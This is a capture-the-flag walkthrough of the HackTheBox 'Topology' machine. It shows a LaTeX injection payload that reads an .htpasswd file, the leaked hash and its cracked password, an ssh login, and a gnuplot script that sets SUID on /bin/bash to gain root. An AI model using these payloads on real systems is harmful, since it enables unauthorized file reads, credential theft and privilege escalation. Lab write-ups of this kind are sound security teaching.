## Topology HackTheBox
## Difficulty = Easy
<hr>

Lets get started

<h2>'Topology walkthrough’</h2>

![image](/posts/res/topology_topology.png)

Today I would walk you through the process of Pwning a Free Hack The
Box machine called Topology.

<h2>Recon and Enumeration</h2>
<h>We always start with an nmap scan.....
Nmap is short for Network Mapper. It is an open-source Linux
command-line tool that is used to scan IP addresses and ports in a
network and to detect installed applications.
Nmap allows network admins to find which devices are running on
their network, discover open ports and services, and detect
vulnerabilities.</h>



<h3>PortScanning</h3>

command:```sudo nmap -sC -sV <machine IP>```

![image](/posts/res/nmap_topology.png)

We have just discovered two open ports and confirmed that we have
some application services running on them using service detection
and default nmap scripts.
So we can see that we have both port 80(http) and 22(ssh) open.
Without wasting much of our time lets begin digging around.
Now we add the machine IP to our host file 10.10.11.217 | Topology.htb

![image](/posts/res/host_topology.png)

with our browser fired up, lets head over to http://topology.htb

![image](/posts/res//webpage_topology.png)

Now let's take a view at the source Code of the Webpage

![image](/posts/res/source_topology.png)

we have just discovered a subdomain called http://latex.topology.htb
Scan the domain name and find all subdomain names that will return
status code 200. Lets run some enumeration using ffuf to see if we
can find any other subdomain.

![image](/posts/res/ffuf_topology.png)

It is found that the subdomain name dev exists, but verification
is required. Add dev.topology.htb, latex.topology.htb to
/etc/hosts and visit the website:

![image](/posts/res/login_topology.png)

Lets visit latex.topology.htb

![image](/posts/res/generator_topology.png)

so I did a research on Latex Equations and discovered that there
could be a possibility to a latex Injection Vulnerability on the
webpage.
So from my research I discovered that I could read and possibly
get the hash from the .htpasswd file to get the User credentials.
Now to read file using latex injection we can make use of the
following:

command: ```$\lstinputlisting{/var/www/dev/.htpasswd}$```

![image](/posts/res/page_topology.png)

![image](/posts/res/hash_topology.png)

Now we have gotten the username and HASH.   
Username = ```vdaisley```   
hash = ```$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0```

in order to determine what hash encryption/type we have, we can
head here and paste the hash into the textbox to identify.
So with our identification process complete we can clearly see
that our hash is an MD5 Encryption

![image](/posts/res/identify_topology.png)
lets decrypt the hash using john to get our password value.   
command: ```sudo john –wordlist=<path-to-your-wordlist> <path-
to-your-Hash-File>```

![image](/posts/res/john_topology.png)

with our hash sucessfully cracked, we now have our password. 


Password = ```calculus20```

so remembering from our nmap scan earlier,we had an ssh port open.
lets try to use these credentials to login via ssh in our
terminal.

![image](/posts/res/ssh_topology.png)

Eureka!! we successfully logged In as vdaisley using the
credentials. Lets find our user flag. To get the user flag just
navigate directories and cat out the user.txt

![image](/posts/res/flag1_topology.png)

we now have our user flag:- ```88a46c6d5da80e3bcbf1e3442d4d353a```



<h2>PRIVILEGE-ESCALATION</h2>


to gain root access we must upload an exploit pspy64. i found
gnuplot in /opt directory which has write and execute permission.
By running PSPY i found there is one process running and
executing a .plt files in the directory as a root
So I downloaded an pspy64 here and started an HTTP server on my
attacker machine using python to enable me to download the
exploit script using wget unto the target machine.

![image](/posts/res/python_server_topology.png)

Command used to start server: ```python3 -m http.server 8000```

![image](/posts/res/wget_topology.png)

with our exploit downloaded unto the machine we can now to make it
executable and run it.
After running pspy64 then run this.

command:- ```echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/privesc.plt```



The Above command made a .plt file inside a directory and with the
statement system chmod u+s.

After a few minutes then run /bin/bash -p to get root. From there
I was able to switch directories and was able to cat out the
root.txt

![image](/posts/res/pspy_topology.png)

Hope you enjoyed my writeup

![image](/posts/res/completed_topology.png)


